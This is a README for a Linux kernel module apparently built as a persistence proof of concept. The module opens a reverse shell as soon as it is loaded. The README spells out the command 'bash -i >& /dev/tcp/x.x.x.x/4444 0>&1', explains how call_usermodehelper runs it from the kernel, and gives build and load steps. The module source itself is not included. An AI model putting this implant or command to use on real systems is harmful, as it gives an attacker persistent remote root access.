# kernshell

If you're like me, and for some reason would like to include a reverse shell in the kernel to test a different approach on persistence, this will likely pique your interest.


## Disclaimer

This code is intended for **educational purposes only**. Running or distributing reverse shells without permission is illegal. Ensure you are working in a controlled, personal or test environment.
This reverse shell kernel module should never be used in production environments. While it is not unstable and does not directly cause system crashes, it carries risks that make it impractical. It is easy detectable by modern security tools, and by no means should this be considered a useful approach due to the following:

- **High detection by EDR/AV/rootkit detection**
- **Lack of error handling**
- **Requiring root access**

Safer, stealthier altrenatives exist and should be used in real-world scenarios.

## Overview

This kernel module demonstrates how to spawn a reverse shell when the module is loaded. The reverse shell connects to a remote server (in this case, `x.x.x.x` on port `4444`) and pops a bash shell running on the target machine. 

## How It Works

- **Initialization**: When the module is loaded into the kernel, it executes a shell command to open a reverse shell.
- **Shell Command**: The command `bash -i >& /dev/tcp/x.x.x.x/4444 0>&1` redirects input/output over a TCP connection to a remote host.
- **Execution**: The `call_usermodehelper` function is used to execute this command in user mode from within the kernel.
- **Cleanup**: When the module is removed, a message is printed to the kernel log indicating that the module has exited.

This is purely a proof of concept for understanding kernel modules and reverse shells. The code is not intended for any production or malicious use.

# How to Use the Included Makefile

To build, install, and manage the kernel module, follow these instructions using the provided Makefile.

## Prerequisites

Ensure you have:
- A Linux build environment (with tools like `build-essential` and `kernel-headers`).
- Root or sudo privileges to load/unload kernel modules.

### Kernel Module Development Environment Setup:

For Debian or Ubuntu-based systems, use the following command:

```bash
sudo apt update
sudo apt install build-essential linux-headers-$(uname -r)
```
For Arch Linux, use the following command:
```bash
sudo pacman -Syu
sudo pacman -S base-devel linux-headers
```
For Red Hat, CentOS, or Fedora-based systems, use the following command:
```bash
sudo dnf groupinstall "Development Tools"
sudo dnf install kernel-devel kernel-headers
```

## Build Commands:

### 1. Build the Module
To compile the kernel module, use the `make` command:

```bash
make
```

### 2. Install the Module
To install (load) the module into the kernel, run:
```bash
sudo make install
```
This inserts the module into the running kernel

### 3. Remove Build Files
To remove the build files created during compilation:
```bash
make clean
```
This deletes temporary files such as `.o` and `.ko.`


### 4. Remove the Kernel Module
To unload and remove the kernel module from the running kernel, use:
```bash
sudo make remove
```
